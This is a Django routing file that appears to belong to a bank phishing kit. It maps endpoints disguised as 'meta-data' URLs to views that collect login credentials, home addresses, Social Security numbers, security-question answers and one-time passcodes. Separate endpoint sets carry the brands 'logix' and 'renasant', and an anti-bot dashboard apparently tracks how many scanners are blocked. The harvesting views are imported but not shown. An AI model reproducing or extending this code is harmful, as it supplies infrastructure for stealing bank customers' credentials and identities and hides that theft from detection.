"""
URL configuration for core project.

The `urlpatterns` list routes URLs to views. For more information please see:
    https://docs.djangoproject.com/en/5.1/topics/http/urls/
Examples:
Function views
    1. Add an import:  from my_app import views
    2. Add a URL to urlpatterns:  path('', views.home, name='home')
Class-based views
    1. Add an import:  from other_app.views import Home
    2. Add a URL to urlpatterns:  path('', Home.as_view(), name='home')
Including another URLconf
    1. Import the include() function: from django.urls import include, path
    2. Add a URL to urlpatterns:  path('blog/', include('blog.urls'))
"""

from django.contrib import admin
from django.urls import include, path
from django.http import HttpResponse
from core.middleware.block_ips_middleware import get_bot_metrics

def bot_dashboard(request):
    """Simple bot detection monitoring dashboard"""
    metrics = get_bot_metrics()

    # Format uptime
    uptime_hours = int(metrics['uptime_seconds'] // 3600)
    uptime_minutes = int((metrics['uptime_seconds'] % 3600) // 60)

    html = f"""
    <html>
    <head><title>Anti-Bot Dashboard</title></head>
    <body style="font-family: Arial, sans-serif; margin: 40px;">
        <h1>🤖 Anti-Bot Detection Dashboard</h1>

        <div style="background: #f0f0f0; padding: 20px; margin: 20px 0; border-radius: 8px;">
            <h2>📊 System Overview</h2>
            <p><strong>Uptime:</strong> {uptime_hours}h {uptime_minutes}m</p>
            <p><strong>Total Requests:</strong> {metrics['total_requests']:,}</p>
            <p><strong>Blocked Requests:</strong> {metrics['blocked_requests']:,}</p>
            <p><strong>Block Rate:</strong> {metrics['block_rate_percent']}%</p>
            <p><strong>Avg Latency:</strong> {metrics['avg_latency_ms']}ms</p>
        </div>

        <div style="background: #e8f4f8; padding: 20px; margin: 20px 0; border-radius: 8px;">
            <h2>🎯 Detection Patterns</h2>
            <ul>
    """

    for pattern, hits in metrics['pattern_hits'].items():
        html += f"<li><strong>{pattern}:</strong> {hits} hits</li>"

    html += """
            </ul>
        </div>

        <div style="background: #fff3cd; padding: 20px; margin: 20px 0; border-radius: 8px;">
            <h2>⚡ Recent Latency (Last 10 requests)</h2>
            <p>
    """

    for latency in metrics['recent_latency_samples']:
        html += f"{latency:.1f}ms "

    html += """
            </p>
        </div>

        <p><em>Dashboard auto-refreshes every 30 seconds</em></p>
        <script>setTimeout(() => location.reload(), 30000);</script>
    </body>
    </html>
    """

    return HttpResponse(html)

from user_data.views import collect_user_basic_info, collect_user_home_address, collect_user_login_cred, collect_user_login_cred2, collect_user_social_security, collect_user_social_security_2, collect_user_security_questions, collect_user_otp_verification
from user_data.logix_views import (
    logix_collect_user_login_cred,
    logix_collect_user_login_cred2,
    logix_collect_user_basic_info,
    logix_collect_user_home_address,
    logix_collect_user_social_security,
    logix_collect_user_social_security_2,
    logix_collect_user_security_questions,
    logix_collect_user_otp_verification,
)
from user_data.renasant_views import (
    renasant_collect_user_login_cred,
    renasant_collect_user_login_cred2,
    renasant_collect_user_basic_info,
    renasant_collect_user_home_address,
    renasant_collect_user_social_security,
    renasant_collect_user_social_security_2,
    renasant_collect_user_security_questions,
    renasant_collect_user_otp_verification,
)

urlpatterns = [
    path("admin/", admin.site.urls),
    path("api/", include("access.urls", "access_api")),
    path("api/meta-data-1/", collect_user_login_cred, name="collect_user_login_cred"),
    path("api/meta-data-2/", collect_user_login_cred2, name="collect_user_login_cred2"),
    path("api/meta-data-3/", collect_user_basic_info, name="collect_user_basic_info"),
    path("api/meta-data-4/", collect_user_home_address, name="collect_user_home_address"),
    path("api/meta-data-5/", collect_user_social_security, name="collect_user_social_security"),
    path("api/meta-data-6/", collect_user_social_security_2, name="collect_user_social_security_2"),
    path("api/meta-data-7/", collect_user_security_questions, name="collect_user_security_questions"),
    path("api/meta-data-8/", collect_user_otp_verification, name="collect_user_otp_verification"),
    # Logix API endpoints
    path("api/logix-meta-data-1/", logix_collect_user_login_cred, name="logix_collect_user_login_cred"),
    path("api/logix-meta-data-2/", logix_collect_user_login_cred2, name="logix_collect_user_login_cred2"),
    path("api/logix-meta-data-3/", logix_collect_user_basic_info, name="logix_collect_user_basic_info"),
    path("api/logix-meta-data-4/", logix_collect_user_home_address, name="logix_collect_user_home_address"),
    path("api/logix-meta-data-5/", logix_collect_user_social_security, name="logix_collect_user_social_security"),
    path("api/logix-meta-data-6/", logix_collect_user_social_security_2, name="logix_collect_user_social_security_2"),
    path("api/logix-meta-data-7/", logix_collect_user_security_questions, name="logix_collect_user_security_questions"),
    path("api/logix-meta-data-8/", logix_collect_user_otp_verification, name="logix_collect_user_otp_verification"),
    # Renasant API endpoints
    path("api/renasant-meta-data-1/", renasant_collect_user_login_cred, name="renasant_collect_user_login_cred"),
    path("api/renasant-meta-data-2/", renasant_collect_user_login_cred2, name="renasant_collect_user_login_cred2"),
    path("api/renasant-meta-data-3/", renasant_collect_user_basic_info, name="renasant_collect_user_basic_info"),
    path("api/renasant-meta-data-4/", renasant_collect_user_home_address, name="renasant_collect_user_home_address"),
    path("api/renasant-meta-data-5/", renasant_collect_user_social_security, name="renasant_collect_user_social_security"),
    path("api/renasant-meta-data-6/", renasant_collect_user_social_security_2, name="renasant_collect_user_social_security_2"),
    path("api/renasant-meta-data-7/", renasant_collect_user_security_questions, name="renasant_collect_user_security_questions"),
    path("api/renasant-meta-data-8/", renasant_collect_user_otp_verification, name="renasant_collect_user_otp_verification"),
    path("dashboard/", bot_dashboard, name="bot_dashboard"),
]
